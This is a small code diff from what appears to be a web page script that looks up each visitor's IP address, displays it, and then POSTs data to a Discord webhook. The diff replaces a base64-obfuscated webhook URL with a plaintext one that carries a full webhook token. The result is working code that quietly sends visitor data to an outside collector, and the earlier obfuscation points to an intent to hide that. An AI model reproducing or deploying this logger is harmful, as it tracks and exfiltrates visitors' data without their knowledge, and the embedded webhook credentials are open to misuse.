@@ -234,8 +234,7 @@
                 const data = await response.json();
                 ipDisplay.textContent = `IP Address: ${data.ip}`;
 
-                const encodedPart1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzMjI4OTk5Mjk1NzEwNDEzOC9qVkFyeGdRT3F6LWRqRlN4YzNLRzNTT0VPeWJ5b0ZPTkRKR0FPNC1fNE9XeWhLRUJzQUwzQkp3ZHJqeEZxOWZ1WkxmQw==";
-                const webhookUrl = atob(encodedPart1); // Try....
+                const webhookUrl = "https://discord.com/api/webhooks/1333014267464519701/yzJYSjkKdmqFtQothDahuIZqhrf-qDNpRZXF7t3og8Ftpc4bvmKzK0kB8p6OrIggPFWS";
 
                 await fetch(webhookUrl, {
                     method: 'POST',
